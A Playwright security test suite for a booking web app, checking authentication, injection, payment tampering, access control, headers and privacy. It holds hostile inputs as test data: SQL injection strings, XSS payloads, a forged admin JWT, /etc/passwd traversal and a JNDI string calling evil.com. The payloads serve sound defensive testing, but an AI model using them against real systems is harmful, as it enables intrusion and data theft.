/**
 * SECURITY VULNERABILITY SCENARIOS
 * Tests critical security vulnerabilities that could compromise user data or business operations
 *
 * Focus: Authentication bypasses, data breaches, payment security, injection attacks
 */

import { expect, test } from "@playwright/test";

test.describe("SECURITY VULNERABILITIES: Critical Attack Vectors", () => {
  test.describe("🔐 Authentication & Authorization", () => {
    test("JWT token manipulation attempt", async ({ page }) => {
      await page.goto("/book");

      // Inject malicious JWT token
      await page.addInitScript(() => {
        // Malicious token attempting privilege escalation
        const maliciousToken =
          "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJzdXBlcl9hZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.";
        localStorage.setItem("sb-access-token", maliciousToken);
      });

      // Attempt to access admin functionality
      await page.goto("/admin");

      // CRITICAL: Should reject invalid token and deny access
      await expect(page.getByTestId("access-denied")).toBeVisible();
      await expect(page.url()).not.toContain("/admin");

      // Should redirect to login
      await expect(page.url()).toMatch(/\/sign-in|\/login/);
    });

    test("Session fixation attack prevention", async ({ page, context }) => {
      // Start with unauthenticated session
      await page.goto("/");

      // Get initial session ID
      const initialSessionId = await page.evaluate(() => {
        return document.cookie.match(/session=([^;]+)/)?.[1];
      });

      // Simulate attacker providing session ID
      await page.evaluate(() => {
        document.cookie = "session=attacker_controlled_session_123; path=/";
      });

      // User logs in
      await page.goto("/sign-in");
      await page.getByTestId("email-input").fill("test@example.com");
      await page.getByTestId("password-input").fill("password123");
      await page.getByRole("button", { name: /sign in/i }).click();

      // CRITICAL: Session ID should be regenerated after login
      const postLoginSessionId = await page.evaluate(() => {
        return document.cookie.match(/session=([^;]+)/)?.[1];
      });

      expect(postLoginSessionId).not.toBe("attacker_controlled_session_123");
      expect(postLoginSessionId).not.toBe(initialSessionId);
    });

    test("CSRF attack on booking creation", async ({ page, context }) => {
      // User logs in normally
      await page.goto("/sign-in");
      await page.getByTestId("email-input").fill("test@example.com");
      await page.getByTestId("password-input").fill("password123");
      await page.getByRole("button", { name: /sign in/i }).click();

      // Attacker creates malicious page
      const maliciousPage = await context.newPage();

      // Simulate CSRF attack via malicious form
      await maliciousPage.setContent(`
        <html>
          <body>
            <form id="csrf-form" action="${page.url().replace(/\/[^\/]*$/, "")}/api/bookings" method="POST">
              <input name="service_type" value="cold_plunge" />
              <input name="date_time" value="2024-12-25T15:00:00Z" />
              <input name="amount" value="999999" />
            </form>
            <script>document.getElementById('csrf-form').submit();</script>
          </body>
        </html>
      `);

      // CRITICAL: CSRF attack should be blocked
      await expect(maliciousPage.getByText(/csrf token/i)).toBeVisible();

      // Verify no unauthorized booking was created
      await page.goto("/dashboard");
      await expect(page.getByText("2024-12-25")).not.toBeVisible();
    });

    test("SQL injection in user input fields", async ({ page }) => {
      await page.goto("/book");
      await page.getByTestId("service-cold-plunge").click();

      // Test SQL injection in various input fields
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1' --",
        "'; UPDATE bookings SET amount=0; --",
        "' UNION SELECT password FROM admin_users --",
        "'; INSERT INTO bookings (user_id, amount) VALUES ('attacker', 999999); --",
      ];

      for (const payload of sqlInjectionPayloads) {
        // Test in address field
        await page.getByTestId("address-input").fill(payload);
        await page.getByTestId("address-input").blur();

        // Test in special instructions
        await page.getByTestId("special-instructions").fill(payload);
        await page.getByTestId("special-instructions").blur();

        // CRITICAL: Should not trigger any SQL errors or unexpected behavior
        await expect(page.getByTestId("sql-error")).not.toBeVisible();
        await expect(page.getByText(/syntax error/i)).not.toBeVisible();
        await expect(page.getByText(/database error/i)).not.toBeVisible();
      }

      // Should complete booking with escaped input
      await page.getByTestId("date-picker").click();
      await page.getByTestId("available-slot").first().click();
      await page.getByRole("button", { name: /complete booking/i }).click();

      // Verify data was properly escaped in database
      await page.goto("/dashboard");
      await expect(page.getByText("'; DROP TABLE users; --")).toBeVisible(); // Literal string
    });

    test("XSS prevention in user-generated content", async ({ page }) => {
      await page.goto("/book");
      await page.getByTestId("service-cold-plunge").click();

      // Test XSS payloads
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(document.cookie)">',
        '"><script>fetch("/api/admin/users").then(r=>r.json()).then(console.log)</script>',
        'javascript:alert("XSS")',
        '<svg onload="alert(1)">',
        '<iframe src="javascript:alert(1)"></iframe>',
      ];

      for (const payload of xssPayloads) {
        await page.getByTestId("special-instructions").fill(payload);
        await page.getByTestId("special-instructions").blur();

        // Complete booking
        await page.getByTestId("address-input").fill("123 Safe St, Secure City, CA");
        await page.getByTestId("date-picker").click();
        await page.getByTestId("available-slot").first().click();
        await page.getByRole("button", { name: /complete booking/i }).click();

        // Check that XSS was not executed
        await page.goto("/dashboard");

        // CRITICAL: Script should be displayed as text, not executed
        const pageContent = await page.content();
        expect(pageContent).toContain("&lt;script&gt;"); // Should be HTML escaped
        expect(pageContent).not.toContain("<script>"); // Should not contain raw script tags

        // No JavaScript should have executed
        const alertFired = await page.evaluate(() => window.localStorage.getItem("xss-executed"));
        expect(alertFired).toBeNull();
      }
    });
  });

  test.describe("💳 Payment Security", () => {
    test("Payment amount manipulation attempt", async ({ page }) => {
      await page.goto("/book");
      await page.getByTestId("service-cold-plunge").click();

      // Complete booking details
      await page.getByTestId("address-input").fill("123 Main St, Anytown, CA 90210");
      await page.getByTestId("date-picker").click();
      await page.getByTestId("available-slot").first().click();

      // Attempt to manipulate payment amount in browser
      await page.evaluate(() => {
        // Try to modify payment amount via DOM manipulation
        const priceElements = document.querySelectorAll(
          '[data-testid*="price"], [data-testid*="amount"]'
        );
        priceElements.forEach((el) => {
          if (el.textContent?.includes("$80")) {
            el.textContent = "$1.00"; // Attempt to reduce price
          }
        });

        // Try to modify hidden form fields
        const hiddenInputs = document.querySelectorAll('input[type="hidden"]');
        hiddenInputs.forEach((input) => {
          if (input.name?.includes("amount")) {
            (input as HTMLInputElement).value = "100"; // $1.00 in cents
          }
        });
      });

      // Attempt to submit manipulated payment
      await page.getByRole("button", { name: /complete booking/i }).click();

      // CRITICAL: Server should validate amount server-side
      const paymentRequest = await page.waitForRequest("**/api/payments/checkout");
      const paymentData = JSON.parse(paymentRequest.postData() || "{}");

      // Should charge correct amount regardless of client manipulation
      expect(paymentData.amount).toBe(8000); // $80.00 in cents
    });

    test("Credit card data exposure prevention", async ({ page }) => {
      await page.goto("/book");
      await page.getByTestId("complete-booking-flow").fill();

      // Check that credit card inputs are properly secured
      const cardInputs = await page.getByTestId("credit-card-input").all();

      for (const input of cardInputs) {
        // Should have autocomplete disabled for sensitive fields
        const autocomplete = await input.getAttribute("autocomplete");
        expect(autocomplete).toMatch(/cc-|new-password|off/);

        // Should be in secure context (HTTPS)
        const isSecure = await page.evaluate(() => window.isSecureContext);
        expect(isSecure).toBe(true);
      }

      // Verify no credit card data is stored in localStorage/sessionStorage
      await page.getByTestId("credit-card-input").fill("4111111111111111");
      await page.getByTestId("expiry-input").fill("12/25");
      await page.getByTestId("cvv-input").fill("123");

      const localStorage = await page.evaluate(() => JSON.stringify(localStorage));
      const sessionStorage = await page.evaluate(() => JSON.stringify(sessionStorage));

      // CRITICAL: No credit card data should be stored locally
      expect(localStorage).not.toMatch(/4111|1111/);
      expect(sessionStorage).not.toMatch(/4111|1111/);
      expect(localStorage).not.toContain("123"); // CVV
      expect(sessionStorage).not.toContain("123"); // CVV
    });

    test("PCI compliance - no card data logging", async ({ page }) => {
      // Monitor console and network for card data exposure
      const consoleMessages: string[] = [];
      const networkRequests: string[] = [];

      page.on("console", (msg) => consoleMessages.push(msg.text()));
      page.on("request", (req) => networkRequests.push(req.url() + " | " + req.postData()));

      await page.goto("/book");
      await page.getByTestId("complete-booking-flow").fill();

      // Enter credit card data
      await page.getByTestId("credit-card-input").fill("4111111111111111");
      await page.getByTestId("expiry-input").fill("12/25");
      await page.getByTestId("cvv-input").fill("123");

      await page.getByRole("button", { name: /complete booking/i }).click();

      // CRITICAL: Card data should never appear in logs or network requests
      const sensitivePatterns = ["4111", "1111", "cvv", "123"];

      for (const pattern of sensitivePatterns) {
        const foundInConsole = consoleMessages.some((msg) => msg.includes(pattern));
        const foundInNetwork = networkRequests.some((req) => req.includes(pattern));

        expect(foundInConsole).toBe(false);
        expect(foundInNetwork).toBe(false);
      }
    });
  });

  test.describe("🔒 Data Access Controls", () => {
    test("User data isolation - accessing other user bookings", async ({ page }) => {
      // Login as regular user
      await page.goto("/sign-in");
      await page.getByTestId("email-input").fill("user1@example.com");
      await page.getByTestId("password-input").fill("password123");
      await page.getByRole("button", { name: /sign in/i }).click();

      // Attempt to access another user's booking directly via URL
      await page.goto("/api/bookings/other-user-booking-id");

      // CRITICAL: Should be denied access
      const response = page.waitForResponse("**/api/bookings/other-user-booking-id");
      const status = (await response).status();
      expect(status).toBeGreaterThanOrEqual(400); // 403 Forbidden or 404 Not Found

      // Attempt IDOR (Insecure Direct Object Reference) attack
      await page.goto("/dashboard");

      // Try to modify API requests to access other user data
      await page.route("**/api/bookings*", async (route) => {
        const url = new URL(route.request().url());

        // Attempt to add other user's ID to query
        url.searchParams.set("user_id", "other-user-123");

        const modifiedRequest = {
          ...route.request(),
          url: url.toString(),
        };

        await route.continue();
      });

      // Should only see own bookings
      const bookingCards = await page.getByTestId("booking-card").all();
      for (const card of bookingCards) {
        const userId = await card.getAttribute("data-user-id");
        expect(userId).not.toBe("other-user-123");
      }
    });

    test("Admin privilege escalation attempt", async ({ page }) => {
      // Login as regular user
      await page.goto("/sign-in");
      await page.getByTestId("email-input").fill("regular-user@example.com");
      await page.getByTestId("password-input").fill("password123");
      await page.getByRole("button", { name: /sign in/i }).click();

      // Attempt to access admin endpoints
      const adminEndpoints = [
        "/admin",
        "/admin/users",
        "/admin/bookings",
        "/admin/settings",
        "/api/admin/users",
        "/api/admin/bookings",
        "/api/admin/settings",
      ];

      for (const endpoint of adminEndpoints) {
        await page.goto(endpoint);

        // CRITICAL: Should be denied access to admin functionality
        await expect(page.getByTestId("access-denied")).toBeVisible();
        await expect(page.url()).not.toContain("/admin");
      }

      // Attempt to modify user role via API
      const roleModification = page.evaluate(async () => {
        return fetch("/api/user/profile", {
          method: "PATCH",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ role: "admin" }),
        });
      });

      // Should be rejected
      await expect(roleModification).rejects.toThrow();
    });

    test("Information disclosure via error messages", async ({ page }) => {
      // Attempt to trigger detailed error messages that might leak info
      await page.goto("/api/bookings/non-existent-id");

      const errorContent = await page.textContent("body");

      // CRITICAL: Error messages should not reveal system details
      expect(errorContent).not.toMatch(/database|sql|table|column/i);
      expect(errorContent).not.toMatch(/stack trace|line \d+/i);
      expect(errorContent).not.toMatch(/file path|server path/i);
      expect(errorContent).not.toMatch(/connection string|password/i);

      // Should show generic error message
      expect(errorContent).toMatch(/not found|invalid|unauthorized/i);
    });
  });

  test.describe("🌐 API Security", () => {
    test("Rate limiting enforcement", async ({ page }) => {
      const requests = [];

      // Generate many rapid requests
      for (let i = 0; i < 100; i++) {
        requests.push(
          page.evaluate(async (index) => {
            return fetch("/api/bookings", {
              method: "GET",
              headers: { "x-test-request": `rate-limit-${index}` },
            }).then((r) => ({ status: r.status, index }));
          }, i)
        );
      }

      const responses = await Promise.allSettled(requests);
      const rateLimitedCount = responses.filter(
        (r) => r.status === "fulfilled" && r.value.status === 429
      ).length;

      // CRITICAL: Should rate limit excessive requests
      expect(rateLimitedCount).toBeGreaterThan(0);
    });

    test("Input validation bypass attempts", async ({ page }) => {
      const maliciousInputs = [
        { field: "email", value: "../../../etc/passwd" },
        { field: "phone", value: "${jndi:ldap://evil.com/a}" },
        { field: "address", value: '{{constructor.constructor("alert(1)")()}}' },
        { field: "date", value: "../../../../etc/shadow" },
        { field: "amount", value: "NaN" },
        { field: "service_type", value: '<script>fetch("/admin")</script>' },
      ];

      for (const input of maliciousInputs) {
        const response = await page.evaluate(async (data) => {
          try {
            const result = await fetch("/api/bookings", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ [data.field]: data.value }),
            });
            return { status: result.status, ok: result.ok };
          } catch (e) {
            return { error: e.message };
          }
        }, input);

        // CRITICAL: Should reject malicious input
        expect(response.status).toBeGreaterThanOrEqual(400);
        expect(response.ok).toBe(false);
      }
    });

    test("CORS policy enforcement", async ({ page }) => {
      // Attempt cross-origin request from malicious domain
      const corsTest = await page.evaluate(async () => {
        try {
          const response = await fetch("https://evil-site.com/api/bookings", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              Origin: "https://malicious-domain.com",
            },
            body: JSON.stringify({ service: "cold_plunge" }),
          });
          return { success: true, status: response.status };
        } catch (error) {
          return { success: false, error: error.message };
        }
      });

      // CRITICAL: CORS should block unauthorized cross-origin requests
      expect(corsTest.success).toBe(false);
      expect(corsTest.error).toMatch(/cors|origin|cross-origin/i);
    });
  });

  test.describe("📱 Client-Side Security", () => {
    test("Local storage security", async ({ page }) => {
      await page.goto("/sign-in");
      await page.getByTestId("email-input").fill("test@example.com");
      await page.getByTestId("password-input").fill("password123");
      await page.getByRole("button", { name: /sign in/i }).click();

      // Check what's stored in localStorage
      const localStorage = await page.evaluate(() => {
        const storage: Record<string, any> = {};
        for (let i = 0; i < window.localStorage.length; i++) {
          const key = window.localStorage.key(i);
          if (key) {
            storage[key] = window.localStorage.getItem(key);
          }
        }
        return storage;
      });

      // CRITICAL: Sensitive data should not be stored in localStorage
      const sensitivePatterns = ["password", "credit", "card", "ssn", "social"];

      for (const [key, value] of Object.entries(localStorage)) {
        const keyValue = `${key}:${value}`.toLowerCase();

        for (const pattern of sensitivePatterns) {
          expect(keyValue).not.toContain(pattern);
        }
      }
    });

    test("Content Security Policy enforcement", async ({ page }) => {
      await page.goto("/");

      // Check CSP headers
      const response = await page.goto("/");
      const cspHeader = response?.headers()["content-security-policy"];

      // CRITICAL: Should have restrictive CSP
      expect(cspHeader).toBeDefined();
      expect(cspHeader).toContain("default-src 'self'");
      expect(cspHeader).not.toContain("'unsafe-eval'");
      expect(cspHeader).not.toContain("'unsafe-inline'");

      // Test CSP violation
      const violationDetected = await page.evaluate(() => {
        try {
          // This should be blocked by CSP
          eval('console.log("CSP violation")');
          return false;
        } catch (e) {
          return true; // CSP blocked the eval
        }
      });

      expect(violationDetected).toBe(true);
    });

    test("Clickjacking protection", async ({ page }) => {
      await page.goto("/");

      // Check X-Frame-Options header
      const response = await page.goto("/");
      const frameOptions = response?.headers()["x-frame-options"];

      // CRITICAL: Should prevent framing
      expect(frameOptions).toMatch(/DENY|SAMEORIGIN/i);

      // Attempt to frame the page
      await page.setContent(`
        <iframe src="${page.url()}" width="100%" height="600"></iframe>
      `);

      // Frame should be blocked
      const iframeContent = await page
        .frameLocator("iframe")
        .getByTestId("main-content")
        .isVisible()
        .catch(() => false);
      expect(iframeContent).toBe(false);
    });
  });

  test.describe("🕵️ Privacy & Data Protection", () => {
    test("GDPR data deletion compliance", async ({ page }) => {
      // User requests data deletion
      await page.goto("/privacy/delete-account");
      await page.getByTestId("confirm-deletion").check();
      await page.getByTestId("reason-select").selectOption("privacy");
      await page.getByRole("button", { name: /delete my account/i }).click();

      // Verify account is marked for deletion
      await expect(page.getByTestId("deletion-scheduled")).toBeVisible();

      // Attempt to access deleted user's data
      await page.goto("/api/user/profile");
      const response = await page.waitForResponse("**/api/user/profile");

      // CRITICAL: Data should be inaccessible after deletion
      expect(response.status()).toBeGreaterThanOrEqual(400);
    });

    test("Data minimization - only necessary data collected", async ({ page }) => {
      await page.goto("/book");

      // Check what data is being collected
      const formFields = await page.getByRole("textbox").all();
      const collectedData: string[] = [];

      for (const field of formFields) {
        const name = await field.getAttribute("name");
        const placeholder = await field.getAttribute("placeholder");
        if (name) collectedData.push(name);
        if (placeholder) collectedData.push(placeholder);
      }

      // CRITICAL: Should not collect unnecessary personal data
      const unnecessaryFields = ["mother_maiden_name", "ssn", "birth_date", "income"];

      for (const field of unnecessaryFields) {
        expect(collectedData.join(" ").toLowerCase()).not.toContain(field);
      }
    });

    test("Analytics data anonymization", async ({ page }) => {
      // Check analytics implementation
      const analyticsRequests: string[] = [];

      page.on("request", (req) => {
        if (req.url().includes("analytics") || req.url().includes("tracking")) {
          analyticsRequests.push(req.postData() || "");
        }
      });

      await page.goto("/");
      await page.getByRole("button", { name: /book now/i }).click();

      // CRITICAL: Analytics should not include PII
      const piiPatterns = ["email", "phone", "address", "name"];

      for (const request of analyticsRequests) {
        for (const pattern of piiPatterns) {
          expect(request.toLowerCase()).not.toContain(pattern);
        }
      }
    });
  });
});
